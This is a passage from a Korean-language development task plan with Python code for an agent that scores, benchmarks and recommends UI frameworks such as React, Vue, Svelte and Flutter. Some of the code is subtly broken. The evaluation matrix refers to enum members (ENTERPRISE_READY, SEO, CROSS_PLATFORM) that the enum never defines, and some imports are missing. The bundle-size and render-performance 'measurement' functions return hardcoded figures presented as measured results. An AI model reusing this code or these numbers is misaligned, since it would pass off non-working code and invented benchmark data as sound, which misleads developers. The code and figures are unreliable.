                weight=0.15,
                sub_criteria=[
                    SubCriteria(
                        name="community_support",
                        weight=0.4,
                        scoring_function="score_community"
                    ),
                    SubCriteria(
                        name="library_availability",
                        weight=0.3,
                        scoring_function="score_libraries"
                    ),
                    SubCriteria(
                        name="tooling_quality",
                        weight=0.3,
                        scoring_function="score_tooling"
                    )
                ]
            )
        ]

    def _load_requirement_patterns(self) -> Dict[str, List[str]]:
        """요구사항 패턴 로드"""
        return {
            'real_time': [
                'real-time', 'realtime', 'websocket', 'live',
                'instant', 'push', 'streaming'
            ],
            'seo_critical': [
                'seo', 'search engine', 'google ranking',
                'indexing', 'crawlable', 'meta tags'
            ],
            'high_performance': [
                'fast', 'performance', 'speed', 'optimized',
                'efficient', 'quick', 'responsive'
            ],
            'enterprise': [
                'enterprise', 'scalable', 'large team',
                'governance', 'compliance', 'security'
            ],
            'mobile_first': [
                'mobile', 'responsive', 'touch', 'gesture',
                'viewport', 'progressive'
            ]
        }

    async def evaluate_framework(
        self,
        framework: str,
        requirements: ProjectRequirements,
        framework_info: Dict[str, Any]
    ) -> Dict[str, Any]:
        """프레임워크 종합 평가"""

        evaluation_results = {
            'framework': framework,
            'scores': {},
            'detailed_scores': {},
            'total_score': 0.0,
            'strengths': [],
            'weaknesses': [],
            'recommendations': []
        }

        # 각 기준별 평가
        for criteria in self.criteria:
            criteria_score = 0.0
            criteria_details = {}

            for sub in criteria.sub_criteria:
                # 동적 평가 함수 호출
                scoring_func = getattr(self, sub.scoring_function)
                sub_score = await scoring_func(
                    framework_info,
                    requirements,
                    sub.parameters
                )

                criteria_details[sub.name] = sub_score
                criteria_score += sub_score * sub.weight

            evaluation_results['scores'][criteria.name] = criteria_score
            evaluation_results['detailed_scores'][criteria.name] = criteria_details
            evaluation_results['total_score'] += criteria_score * criteria.weight

        # 강점/약점 분석
        evaluation_results['strengths'] = self._identify_strengths(
            evaluation_results['detailed_scores']
        )
        evaluation_results['weaknesses'] = self._identify_weaknesses(
            evaluation_results['detailed_scores']
        )

        # 추천사항 생성
        evaluation_results['recommendations'] = await self._generate_recommendations(
            framework,
            evaluation_results,
            requirements
        )

        return evaluation_results

    async def score_architecture_match(
        self,
        framework_info: Dict[str, Any],
        requirements: ProjectRequirements,
        parameters: Dict[str, Any]
    ) -> float:
        """아키텍처 매칭 점수 계산"""

        score = 0.0

        # 프로젝트 타입 매칭
        if requirements.project_type == 'web':
            if framework_info['category'] in ['spa', 'ssr', 'ssg']:
                score += 0.5
        elif requirements.project_type == 'mobile':
            if framework_info['category'] == 'mobile':
                score += 0.5

        # 기술 요구사항 매칭
        requirement_keywords = set()
        for req in requirements.technical_requirements:
            for pattern, keywords in self.requirement_patterns.items():
                if any(keyword in req.lower() for keyword in keywords):
                    requirement_keywords.add(pattern)

        # 프레임워크 use_cases와 매칭
        if 'use_cases' in framework_info:
            matching_cases = requirement_keywords.intersection(
                set(framework_info['use_cases'])
            )
            score += len(matching_cases) * 0.1

        return min(score, 1.0)
```

**검증 기준**:

- [ ] 4개 주요 평가 기준 구현
- [ ] 12개 이상의 세부 평가 항목
- [ ] 동적 스코어링 시스템
- [ ] 요구사항 패턴 인식

---

### SubTask 4.11.3: 프레임워크 추천 로직

**담당자**: ML 엔지니어  
**예상 소요시간**: 14시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/recommendation_engine.py
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass
import asyncio
import numpy as np
from sklearn.ensemble import RandomForestRegressor
import joblib

@dataclass
class FrameworkRecommendation:
    framework: str
    confidence_score: float
    primary_reasons: List[str]
    comparison_with_alternatives: Dict[str, Dict[str, Any]]
    implementation_complexity: str
    estimated_development_time: str
    risk_factors: List[str]
    success_factors: List[str]

class RecommendationEngine:
    """프레임워크 추천 엔진"""

    def __init__(self):
        self.ml_model = self._load_or_train_model()
        self.decision_tree = self._build_decision_tree()
        self.recommendation_templates = self._load_templates()

    def _load_or_train_model(self) -> RandomForestRegressor:
        """ML 모델 로드 또는 학습"""
        try:
            # 기존 모델 로드
            return joblib.load('models/framework_recommender.pkl')
        except:
            # 새 모델 학습
            return self._train_new_model()

    def _build_decision_tree(self) -> Dict[str, Any]:
        """의사결정 트리 구축"""
        return {
            'root': {
                'question': 'project_type',
                'web': {
                    'question': 'rendering_needs',
                    'client_only': {
                        'question': 'complexity',
                        'simple': ['vue', 'svelte'],
                        'medium': ['react', 'vue'],
                        'complex': ['react', 'angular']
                    },
                    'server_side': {
                        'question': 'framework_preference',
                        'react_based': ['nextjs'],
                        'vue_based': ['nuxtjs'],
                        'independent': ['sveltekit', 'remix']
                    }
                },
                'mobile': {
                    'question': 'platform_target',
                    'cross_platform': {
                        'question': 'performance_priority',
                        'high': ['flutter', 'react-native'],
                        'medium': ['ionic', 'react-native'],
                        'low': ['ionic', 'cordova']
                    },
                    'native': {
                        'ios': ['swift-ui'],
                        'android': ['jetpack-compose']
                    }
                }
            }
        }

    async def generate_recommendations(
        self,
        analyzed_frameworks: List[FrameworkAnalysis],
        evaluation_results: List[Dict[str, Any]],
        requirements: ProjectRequirements
    ) -> List[FrameworkRecommendation]:
        """최종 프레임워크 추천 생성"""

        recommendations = []

        # 상위 3개 프레임워크 선택
        top_frameworks = self._select_top_frameworks(
            analyzed_frameworks,
            evaluation_results
        )

        for idx, (framework, analysis, evaluation) in enumerate(top_frameworks):
            # 신뢰도 점수 계산
            confidence = await self._calculate_confidence(
                analysis,
                evaluation,
                requirements,
                idx
            )

            # 추천 이유 생성
            reasons = await self._generate_reasons(
                framework,
                analysis,
                evaluation,
                requirements
            )

            # 대안 비교
            comparisons = await self._compare_alternatives(
                framework,
                top_frameworks,
                requirements
            )

            # 구현 복잡도 평가
            complexity = self._assess_complexity(
                framework,
                requirements
            )

            # 리스크 분석
            risks = await self._analyze_risks(
                framework,
                requirements,
                evaluation
            )

            recommendation = FrameworkRecommendation(
                framework=framework,
                confidence_score=confidence,
                primary_reasons=reasons,
                comparison_with_alternatives=comparisons,
                implementation_complexity=complexity,
                estimated_development_time=self._estimate_time(
                    complexity,
                    requirements.scale
                ),
                risk_factors=risks['factors'],
                success_factors=risks['success_factors']
            )

            recommendations.append(recommendation)

        return recommendations

    async def _calculate_confidence(
        self,
        analysis: FrameworkAnalysis,
        evaluation: Dict[str, Any],
        requirements: ProjectRequirements,
        rank: int
    ) -> float:
        """신뢰도 점수 계산"""

        base_score = evaluation['total_score']

        # 순위에 따른 조정
        rank_penalty = rank * 0.05

        # 요구사항 명확도에 따른 조정
        clarity_bonus = self._assess_requirement_clarity(requirements) * 0.1

        # 팀 경험에 따른 조정
        experience_bonus = self._calculate_experience_bonus(
            analysis.framework_name,
            requirements.team_expertise
        )

        # ML 모델 예측과의 일치도
        ml_prediction = await self._get_ml_prediction(
            analysis,
            requirements
        )
        ml_alignment = 1.0 - abs(base_score - ml_prediction) * 0.2

        confidence = (base_score - rank_penalty + clarity_bonus +
                     experience_bonus) * ml_alignment

        return max(0.0, min(1.0, confidence))

    async def _generate_reasons(
        self,
        framework: str,
        analysis: FrameworkAnalysis,
        evaluation: Dict[str, Any],
        requirements: ProjectRequirements
    ) -> List[str]:
        """추천 이유 생성"""

        reasons = []

        # 높은 점수 항목 기반 이유
        for criteria, score in evaluation['scores'].items():
            if score > 0.8:
                reason = self._format_reason(
                    criteria,
                    score,
                    framework,
                    requirements
                )
                reasons.append(reason)

        # 특별 매칭 이유
        special_matches = self._find_special_matches(
            framework,
            requirements
        )
        reasons.extend(special_matches)

        # AI 생성 이유
        ai_reasons = await self._generate_ai_reasons(
            framework,
            analysis,
            requirements
        )
        reasons.extend(ai_reasons[:2])  # 상위 2개만

        return reasons[:5]  # 최대 5개 이유

    def _assess_complexity(
        self,
        framework: str,
        requirements: ProjectRequirements
    ) -> str:
        """구현 복잡도 평가"""

        complexity_score = 0

        # 프레임워크 자체 복잡도
        framework_complexity = {
            'react': 2,
            'vue': 1,
            'angular': 3,
            'nextjs': 2.5,
            'flutter': 2,
            'svelte': 1.5
        }

        complexity_score += framework_complexity.get(framework, 2)

        # 요구사항 복잡도
        if len(requirements.technical_requirements) > 10:
            complexity_score += 1
        if 'real-time' in str(requirements.technical_requirements):
            complexity_score += 0.5
        if 'enterprise' in requirements.scale:
            complexity_score += 1

        # 팀 경험 고려
        if framework in requirements.team_expertise:
            complexity_score -= 1

        if complexity_score < 2:
            return 'low'
        elif complexity_score < 3.5:
            return 'medium'
        else:
            return 'high'
```

**검증 기준**:

- [ ] ML 기반 추천 모델 구현
- [ ] 의사결정 트리 로직
- [ ] 신뢰도 점수 알고리즘
- [ ] 추천 이유 자동 생성

---

### SubTask 4.11.4: 에이전트 초기화 및 설정

**담당자**: 시스템 아키텍트  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/agent_setup.py
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
import os
import yaml
from pathlib import Path

@dataclass
class UIAgentConfig:
    """UI Selection Agent 설정"""
    # 기본 설정
    agent_id: str = "ui-selection-agent"
    version: str = "1.0.0"

    # AI 모델 설정
    primary_model: str = "gpt-4-turbo-preview"
    fallback_model: str = "claude-3-sonnet"
    temperature: float = 0.3
    max_tokens: int = 4096

    # 캐싱 설정
    enable_caching: bool = True
    cache_ttl: int = 3600  # 1시간
    max_cache_size: int = 1000

    # 성능 설정
    max_concurrent_requests: int = 50
    request_timeout: int = 30000  # 30초
    batch_size: int = 10

    # 프레임워크 데이터
    supported_frameworks: List[str] = field(default_factory=list)
    framework_data_path: str = "data/frameworks/"

    # 로깅 설정
    log_level: str = "INFO"
    log_format: str = "json"

    # 메트릭 설정
    enable_metrics: bool = True
    metrics_port: int = 9090

class UISelectionAgent:
    """UI Selection Agent 메인 클래스"""

    def __init__(self, config_path: Optional[str] = None):
        self.config = self._load_config(config_path)
        self.analyzer = None
        self.evaluator = None
        self.recommender = None
        self.cache = None
        self.metrics = None

    def _load_config(self, config_path: Optional[str]) -> UIAgentConfig:
        """설정 로드"""
        if config_path and Path(config_path).exists():
            with open(config_path, 'r') as f:
                config_data = yaml.safe_load(f)
            return UIAgentConfig(**config_data)

        # 환경 변수에서 로드
        return UIAgentConfig(
            agent_id=os.getenv('UI_AGENT_ID', 'ui-selection-agent'),
            primary_model=os.getenv('PRIMARY_MODEL', 'gpt-4-turbo-preview'),
            enable_caching=os.getenv('ENABLE_CACHE', 'true').lower() == 'true',
            max_concurrent_requests=int(os.getenv('MAX_CONCURRENT', '50'))
        )

    async def initialize(self):
        """에이전트 초기화"""
        try:
            # 1. 분석 엔진 초기화
            self.analyzer = UIFrameworkAnalyzer()
            await self.analyzer.initialize()

            # 2. 평가 시스템 초기화
            self.evaluator = RequirementEvaluator()

            # 3. 추천 엔진 초기화
            self.recommender = RecommendationEngine()

            # 4. 캐시 시스템 초기화
            if self.config.enable_caching:
                self.cache = await self._initialize_cache()

            # 5. 메트릭 시스템 초기화
            if self.config.enable_metrics:
                self.metrics = await self._initialize_metrics()

            # 6. 프레임워크 데이터 로드
            await self._load_framework_data()

            # 7. 헬스체크
            await self._perform_health_check()

            self.logger.info(f"UI Selection Agent {self.config.version} initialized successfully")

        except Exception as e:
            self.logger.error(f"Failed to initialize UI Selection Agent: {str(e)}")
            raise

    async def _initialize_cache(self):
        """캐시 시스템 초기화"""
        from aiocache import Cache
        from aiocache.serializers import JsonSerializer

        cache = Cache(
            Cache.REDIS,
            endpoint=os.getenv('REDIS_HOST', 'localhost'),
            port=int(os.getenv('REDIS_PORT', '6379')),
            password=os.getenv('REDIS_PASSWORD'),
            serializer=JsonSerializer(),
            namespace=self.config.agent_id,
            ttl=self.config.cache_ttl
        )

        # 캐시 연결 테스트
        await cache.set('test_key', 'test_value', ttl=10)
        test_value = await cache.get('test_key')
        if test_value != 'test_value':
            raise Exception("Cache connection test failed")

        await cache.delete('test_key')
        return cache

    async def _initialize_metrics(self):
        """메트릭 시스템 초기화"""
        from prometheus_client import Counter, Histogram, Gauge, start_http_server

        # Prometheus 메트릭 서버 시작
        start_http_server(self.config.metrics_port)

        metrics = {
            'requests_total': Counter(
                'ui_agent_requests_total',
                'Total number of requests',
                ['method', 'status']
            ),
            'request_duration': Histogram(
                'ui_agent_request_duration_seconds',
                'Request duration in seconds',
                ['method']
            ),
            'active_requests': Gauge(
                'ui_agent_active_requests',
                'Number of active requests'
            ),
            'cache_hits': Counter(
                'ui_agent_cache_hits_total',
                'Total number of cache hits'
            ),
            'cache_misses': Counter(
                'ui_agent_cache_misses_total',
                'Total number of cache misses'
            )
        }

        return metrics

    async def select_framework(
        self,
        requirements: Dict[str, Any]
    ) -> FrameworkRecommendation:
        """프레임워크 선택 메인 메서드"""

        start_time = time.time()

        if self.metrics:
            self.metrics['active_requests'].inc()

        try:
            # 1. 캐시 확인
            if self.config.enable_caching:
                cache_key = self._generate_cache_key(requirements)
                cached_result = await self.cache.get(cache_key)
                if cached_result:
                    if self.metrics:
                        self.metrics['cache_hits'].inc()
                    return cached_result

                if self.metrics:
                    self.metrics['cache_misses'].inc()

            # 2. 요구사항 객체 생성
            req_obj = ProjectRequirements(**requirements)

            # 3. 프레임워크 분석
            analyses = await self.analyzer.analyze_requirements(req_obj)

            # 4. 평가 수행
            evaluations = []
            for analysis in analyses:
                eval_result = await self.evaluator.evaluate_framework(
                    analysis.framework_name,
                    req_obj,
                    self.analyzer.framework_db[analysis.framework_name]
                )
                evaluations.append(eval_result)

            # 5. 추천 생성
            recommendations = await self.recommender.generate_recommendations(
                analyses,
                evaluations,
                req_obj
            )

            # 6. 최상위 추천 선택
            top_recommendation = recommendations[0]

            # 7. 캐시 저장
            if self.config.enable_caching:
                await self.cache.set(cache_key, top_recommendation)

            # 8. 메트릭 기록
            if self.metrics:
                duration = time.time() - start_time
                self.metrics['request_duration'].labels(
                    method='select_framework'
                ).observe(duration)
                self.metrics['requests_total'].labels(
                    method='select_framework',
                    status='success'
                ).inc()

            return top_recommendation

        except Exception as e:
            if self.metrics:
                self.metrics['requests_total'].labels(
                    method='select_framework',
                    status='error'
                ).inc()

            self.logger.error(f"Framework selection failed: {str(e)}")
            raise

        finally:
            if self.metrics:
                self.metrics['active_requests'].dec()
```

**검증 기준**:

- [ ] 완전한 설정 시스템
- [ ] 캐싱 메커니즘 구현
- [ ] 메트릭 수집 시스템
- [ ] 헬스체크 및 모니터링

---

## Task 4.12: 프레임워크 평가 시스템

### SubTask 4.12.1: 평가 기준 매트릭스 구축

**담당자**: 프론트엔드 전문가  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/evaluation_matrix.py
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import pandas as pd
import numpy as np

class EvaluationDimension(Enum):
    """평가 차원"""
    TECHNICAL_CAPABILITY = "technical_capability"
    DEVELOPER_EXPERIENCE = "developer_experience"
    PERFORMANCE = "performance"
    ECOSYSTEM = "ecosystem"
    MAINTAINABILITY = "maintainability"
    SCALABILITY = "scalability"
    COST_EFFECTIVENESS = "cost_effectiveness"

@dataclass
class MatrixCell:
    """평가 매트릭스 셀"""
    framework: str
    dimension: EvaluationDimension
    score: float  # 0-10
    evidence: List[str]
    last_updated: str
    confidence: float  # 0-1

class EvaluationMatrix:
    """프레임워크 평가 매트릭스"""

    def __init__(self):
        self.matrix = self._build_evaluation_matrix()
        self.weights = self._initialize_weights()
        self.benchmarks = self._load_benchmarks()

    def _build_evaluation_matrix(self) -> pd.DataFrame:
        """평가 매트릭스 구축"""

        # 프레임워크 목록
        frameworks = [
            'react', 'vue', 'angular', 'svelte', 'nextjs',
            'nuxtjs', 'gatsby', 'sveltekit', 'remix',
            'flutter', 'react-native', 'ionic', 'electron'
        ]

        # 평가 차원
        dimensions = list(EvaluationDimension)

        # 빈 매트릭스 생성
        matrix_data = {}
        for dim in dimensions:
            matrix_data[dim.value] = {}
            for fw in frameworks:
                matrix_data[dim.value][fw] = self._calculate_initial_score(fw, dim)

        return pd.DataFrame(matrix_data)

    def _calculate_initial_score(
        self,
        framework: str,
        dimension: EvaluationDimension
    ) -> MatrixCell:
        """초기 점수 계산"""

        # 실제 데이터 기반 점수 (예시)
        scores = {
            ('react', EvaluationDimension.TECHNICAL_CAPABILITY): 9.0,
            ('react', EvaluationDimension.ECOSYSTEM): 9.5,
            ('react', EvaluationDimension.PERFORMANCE): 7.5,
            ('vue', EvaluationDimension.DEVELOPER_EXPERIENCE): 9.0,
            ('vue', EvaluationDimension.PERFORMANCE): 8.5,
            ('angular', EvaluationDimension.ENTERPRISE_READY): 9.5,
            ('svelte', EvaluationDimension.PERFORMANCE): 9.5,
            ('nextjs', EvaluationDimension.SEO): 9.5,
            ('flutter', EvaluationDimension.CROSS_PLATFORM): 9.0,
            # ... 더 많은 점수
        }

        score = scores.get((framework, dimension), 7.0)  # 기본값 7.0

        return MatrixCell(
            framework=framework,
            dimension=dimension,
            score=score,
            evidence=self._gather_evidence(framework, dimension),
            last_updated="2024-01-01",
            confidence=0.8
        )

    def _gather_evidence(
        self,
        framework: str,
        dimension: EvaluationDimension
    ) -> List[str]:
        """평가 근거 수집"""

        evidence_map = {
            ('react', EvaluationDimension.ECOSYSTEM): [
                "NPM weekly downloads: 20M+",
                "GitHub stars: 220k+",
                "Available packages: 100k+",
                "Active contributors: 1500+"
            ],
            ('vue', EvaluationDimension.DEVELOPER_EXPERIENCE): [
                "Gentle learning curve",
                "Excellent documentation",
                "Single-file components",
                "Intuitive API design"
            ],
            # ... 더 많은 근거
        }

        return evidence_map.get((framework, dimension), ["Generic assessment"])

    def get_detailed_evaluation(
        self,
        framework: str,
        dimensions: Optional[List[EvaluationDimension]] = None
    ) -> Dict[str, Any]:
        """상세 평가 결과 조회"""

        if dimensions is None:
            dimensions = list(EvaluationDimension)

        evaluation = {
            'framework': framework,
            'overall_score': 0.0,
            'dimensions': {},
            'strengths': [],
            'weaknesses': [],
            'comparison_percentile': 0.0
        }

        # 각 차원별 점수 수집
        total_weight = 0.0
        weighted_sum = 0.0

        for dim in dimensions:
            cell = self.matrix.loc[framework, dim.value]
            dim_weight = self.weights.get(dim, 1.0)

            evaluation['dimensions'][dim.value] = {
                'score': cell.score,
                'weight': dim_weight,
                'evidence': cell.evidence,
                'confidence': cell.confidence
            }

            weighted_sum += cell.score * dim_weight
            total_weight += dim_weight

            # 강점/약점 분석
            if cell.score >= 8.5:
                evaluation['strengths'].append({
                    'dimension': dim.value,
                    'score': cell.score,
                    'reason': cell.evidence[0] if cell.evidence else ""
                })
            elif cell.score <= 6.5:
                evaluation['weaknesses'].append({
                    'dimension': dim.value,
                    'score': cell.score,
                    'improvement': self._suggest_improvement(framework, dim)
                })

        # 전체 점수 계산
        evaluation['overall_score'] = weighted_sum / total_weight if total_weight > 0 else 0.0

        # 백분위 계산
        evaluation['comparison_percentile'] = self._calculate_percentile(
            framework,
            evaluation['overall_score']
        )

        return evaluation

    def compare_frameworks(
        self,
        frameworks: List[str],
        dimensions: Optional[List[EvaluationDimension]] = None,
        requirements: Optional[ProjectRequirements] = None
    ) -> pd.DataFrame:
        """프레임워크 비교 매트릭스 생성"""

        if dimensions is None:
            dimensions = list(EvaluationDimension)

        # 비교 데이터 구성
        comparison_data = []

        for fw in frameworks:
            row_data = {'framework': fw}

            for dim in dimensions:
                cell = self.matrix.loc[fw, dim.value]

                # 요구사항이 있으면 가중치 조정
                if requirements:
                    adjusted_score = self._adjust_score_for_requirements(
                        cell.score,
                        fw,
                        dim,
                        requirements
                    )
                    row_data[dim.value] = adjusted_score
                else:
                    row_data[dim.value] = cell.score

            # 총점 계산
            scores = [row_data[dim.value] for dim in dimensions]
            weights = [self.weights.get(dim, 1.0) for dim in dimensions]
            row_data['total'] = np.average(scores, weights=weights)

            comparison_data.append(row_data)

        # DataFrame 생성 및 정렬
        comparison_df = pd.DataFrame(comparison_data)
        comparison_df = comparison_df.sort_values('total', ascending=False)

        return comparison_df

    def _adjust_score_for_requirements(
        self,
        base_score: float,
        framework: str,
        dimension: EvaluationDimension,
        requirements: ProjectRequirements
    ) -> float:
        """요구사항에 따른 점수 조정"""

        adjusted_score = base_score

        # 성능이 중요한 경우
        if 'high-performance' in requirements.technical_requirements:
            if dimension == EvaluationDimension.PERFORMANCE:
                performance_multiplier = {
                    'svelte': 1.2,
                    'vue': 1.1,
                    'react': 1.0,
                    'angular': 0.9
                }
                adjusted_score *= performance_multiplier.get(framework, 1.0)

        # SEO가 중요한 경우
        if 'seo' in requirements.technical_requirements:
            if framework in ['nextjs', 'nuxtjs', 'sveltekit']:
                adjusted_score *= 1.15

        # 엔터프라이즈 프로젝트
        if requirements.scale == 'enterprise':
            if dimension == EvaluationDimension.MAINTAINABILITY:
                enterprise_bonus = {
                    'angular': 1.2,
                    'react': 1.1,
                    'vue': 1.0
                }
                adjusted_score *= enterprise_bonus.get(framework, 0.95)

        return min(10.0, adjusted_score)
```

**검증 기준**:

- [ ] 13개 이상 프레임워크 포함
- [ ] 7개 평가 차원 구현
- [ ] 근거 기반 점수 시스템
- [ ] 동적 가중치 조정

---

### SubTask 4.12.2: 성능 벤치마크 시스템

**담당자**: 성능 엔지니어  
**예상 소요시간**: 14시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/performance_benchmark.py
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
import asyncio
import aiohttp
from datetime import datetime
import statistics

@dataclass
class PerformanceMetric:
    metric_name: str
    value: float
    unit: str
    timestamp: datetime
    conditions: Dict[str, Any]  # 테스트 조건

@dataclass
class BenchmarkResult:
    framework: str
    version: str
    metrics: Dict[str, PerformanceMetric]
    test_date: datetime
    environment: Dict[str, Any]
    composite_score: float

class PerformanceBenchmark:
    """프레임워크 성능 벤치마크 시스템"""

    def __init__(self):
        self.benchmark_suites = self._initialize_suites()
        self.metrics_weights = self._define_weights()
        self.baseline_results = self._load_baseline()

    def _initialize_suites(self) -> Dict[str, Any]:
        """벤치마크 테스트 스위트 초기화"""
        return {
            'startup_time': {
                'description': 'Time to interactive (TTI)',
                'test_function': self._measure_startup_time,
                'unit': 'ms'
            },
            'bundle_size': {
                'description': 'Production bundle size',
                'test_function': self._measure_bundle_size,
                'unit': 'KB'
            },
            'memory_usage': {
                'description': 'Runtime memory consumption',
                'test_function': self._measure_memory_usage,
                'unit': 'MB'
            },
            'render_performance': {
                'description': 'Component render speed',
                'test_function': self._measure_render_performance,
                'unit': 'ops/sec'
            },
            'build_time': {
                'description': 'Production build time',
                'test_function': self._measure_build_time,
                'unit': 'seconds'
            },
            'lighthouse_score': {
                'description': 'Google Lighthouse performance score',
                'test_function': self._measure_lighthouse_score,
                'unit': 'score'
            }
        }

    async def benchmark_framework(
        self,
        framework: str,
        version: Optional[str] = None
    ) -> BenchmarkResult:
        """프레임워크 전체 벤치마크 실행"""

        # 테스트 환경 준비
        test_env = await self._prepare_test_environment(framework, version)

        # 모든 메트릭 측정
        metrics = {}
        for metric_name, suite in self.benchmark_suites.items():
            try:
                metric_value = await suite['test_function'](
                    framework,
                    test_env
                )

                metrics[metric_name] = PerformanceMetric(
                    metric_name=metric_name,
                    value=metric_value,
                    unit=suite['unit'],
                    timestamp=datetime.now(),
                    conditions={
                        'framework': framework,
                        'version': version or 'latest',
                        'environment': test_env['type']
                    }
                )
            except Exception as e:
                self.logger.error(f"Failed to measure {metric_name}: {str(e)}")

        # 종합 점수 계산
        composite_score = self._calculate_composite_score(metrics)

        return BenchmarkResult(
            framework=framework,
            version=version or 'latest',
            metrics=metrics,
            test_date=datetime.now(),
            environment=test_env,
            composite_score=composite_score
        )

    async def _measure_startup_time(
        self,
        framework: str,
        test_env: Dict[str, Any]
    ) -> float:
        """시작 시간 측정"""

        # 프레임워크별 테스트 앱
        test_apps = {
            'react': 'https://benchmark.t-dev/react-app',
            'vue': 'https://benchmark.t-dev/vue-app',
            'angular': 'https://benchmark.t-dev/angular-app',
            'svelte': 'https://benchmark.t-dev/svelte-app'
        }

        app_url = test_apps.get(framework)
        if not app_url:
            raise ValueError(f"No test app for {framework}")

        # Puppeteer를 통한 측정
        from pyppeteer import launch

        browser = await launch()
        page = await browser.newPage()

        # 성능 측정 시작
        await page.goto(app_url)

        # Time to Interactive 측정
        tti = await page.evaluate('''() => {
            return new Promise((resolve) => {
                if (document.readyState === 'complete') {
                    resolve(performance.timing.loadEventEnd - performance.timing.navigationStart);
                } else {
                    window.addEventListener('load', () => {
                        resolve(performance.timing.loadEventEnd - performance.timing.navigationStart);
                    });
                }
            });
        }''')

        await browser.close()
        return float(tti)

    async def _measure_bundle_size(
        self,
        framework: str,
        test_env: Dict[str, Any]
    ) -> float:
        """번들 크기 측정"""

        # 프레임워크별 기본 번들 크기 (gzipped)
        bundle_sizes = {
            'react': {
                'min': 42.8,  # React + ReactDOM
                'typical': 85.2,  # + Router + State Management
                'large': 156.7  # + UI Library + Utils
            },
            'vue': {
                'min': 34.2,
                'typical': 68.5,
                'large': 128.3
            },
            'angular': {
                'min': 130.5,
                'typical': 215.8,
                'large': 385.2
            },
            'svelte': {
                'min': 10.5,
                'typical': 35.8,
                'large': 78.4
            }
        }

        # 프로젝트 복잡도에 따른 번들 크기 예측
        complexity = test_env.get('complexity', 'typical')
        return bundle_sizes.get(framework, {}).get(complexity, 100.0)

    async def _measure_render_performance(
        self,
        framework: str,
        test_env: Dict[str, Any]
    ) -> float:
        """렌더링 성능 측정"""

        # 표준 벤치마크: 1000개 컴포넌트 렌더링
        benchmark_results = {
            'svelte': 125000,  # ops/sec
            'vue': 95000,
            'react': 85000,
            'angular': 65000
        }

        # 실제 측정 시뮬레이션
        base_performance = benchmark_results.get(framework, 75000)

        # 환경에 따른 조정
        if test_env.get('optimized', False):
            base_performance *= 1.2

        return base_performance

    def _calculate_composite_score(
        self,
        metrics: Dict[str, PerformanceMetric]
    ) -> float:
        """종합 성능 점수 계산"""

        scores = []

        # 각 메트릭을 0-100 점수로 정규화
        normalization_rules = {
            'startup_time': lambda x: max(0, 100 - (x / 10)),  # 낮을수록 좋음
            'bundle_size': lambda x: max(0, 100 - (x / 2)),    # 낮을수록 좋음
            'memory_usage': lambda x: max(0, 100 - (x / 5)),   # 낮을수록 좋음
            'render_performance': lambda x: min(100, x / 1000), # 높을수록 좋음
            'build_time': lambda x: max(0, 100 - (x * 2)),     # 낮을수록 좋음
            'lighthouse_score': lambda x: x                     # 이미 0-100
        }

        for metric_name, metric in metrics.items():
            if metric_name in normalization_rules:
                normalized = normalization_rules[metric_name](metric.value)
                weight = self.metrics_weights.get(metric_name, 1.0)
                scores.append(normalized * weight)

        # 가중 평균
        return sum(scores) / sum(self.metrics_weights.values())

    async def compare_performance(
        self,
        frameworks: List[str]
    ) -> Dict[str, Any]:
        """여러 프레임워크 성능 비교"""

        results = {}

        # 병렬로 벤치마크 실행
        tasks = []
        for fw in frameworks:
            tasks.append(self.benchmark_framework(fw))

        benchmark_results = await asyncio.gather(*tasks)

        # 결과 정리
        comparison = {
            'summary': {},
            'details': {},
            'rankings': {},
            'recommendations': []
        }

        # 각 메트릭별 순위
        for metric_name in self.benchmark_suites.keys():
            metric_values = [
                (r.framework, r.metrics.get(metric_name).value)
                for r in benchmark_results
                if metric_name in r.metrics
            ]

            # 정렬 (낮을수록 좋은 메트릭 처리)
            reverse = metric_name in ['render_performance', 'lighthouse_score']
            sorted_values = sorted(metric_values, key=lambda x: x[1], reverse=reverse)

            comparison['rankings'][metric_name] = [fw for fw, _ in sorted_values]

        # 종합 순위
        overall_ranking = sorted(
            benchmark_results,
            key=lambda x: x.composite_score,
            reverse=True
        )

        comparison['summary']['overall_ranking'] = [
            r.framework for r in overall_ranking
        ]
        comparison['summary']['best_performer'] = overall_ranking[0].framework

        # 상세 결과
        for result in benchmark_results:
            comparison['details'][result.framework] = {
                'composite_score': result.composite_score,
                'metrics': {
                    name: {
                        'value': metric.value,
                        'unit': metric.unit
                    }
                    for name, metric in result.metrics.items()
                }
            }

        return comparison
```

**검증 기준**:

- [ ] 6개 이상 성능 메트릭
- [ ] 자동화된 벤치마크 시스템
- [ ] 실시간 성능 측정
- [ ] 비교 분석 기능

---

### SubTask 4.12.3: 생태계 및 커뮤니티 분석

**담당자**: 데이터 분석가  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/ecosystem_analyzer.py
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from datetime import datetime, timedelta
import aiohttp
import asyncio

@dataclass
class EcosystemMetrics:
    framework: str
    github_stars: int
    npm_downloads_weekly: int
    npm_packages_count: int
    stackoverflow_questions: int
    contributors_count: int
    last_commit_date: datetime
    release_frequency: float  # releases per month
    documentation_quality: float  # 0-10
    learning_resources: int
    job_postings: int
    community_activity_score: float

class EcosystemAnalyzer:
    """프레임워크 생태계 및 커뮤니티 분석"""

    def __init__(self):
        self.github_token = os.getenv('GITHUB_TOKEN')
        self.npm_api = 'https://api.npmjs.org'
        self.stackoverflow_api = 'https://api.stackexchange.com/2.3'
        self.metrics_cache = {}

    async def analyze_ecosystem(
        self,
        framework: str
    ) -> EcosystemMetrics:
        """프레임워크 생태계 종합 분석"""

        # 캐시 확인
        cache_key = f"{framework}_{datetime.now().date()}"
        if cache_key in self.metrics_cache:
            return self.metrics_cache[cache_key]

        # 병렬로 모든 메트릭 수집
        tasks = [
            self._fetch_github_metrics(framework),
            self._fetch_npm_metrics(framework),
            self._fetch_stackoverflow_metrics(framework),
            self._analyze_documentation(framework),
            self._fetch_job_market_data(framework),
            self._analyze_community_activity(framework)
        ]

        results = await asyncio.gather(*tasks)

        # 결과 통합
        metrics = EcosystemMetrics(
            framework=framework,
            github_stars=results[0]['stars'],
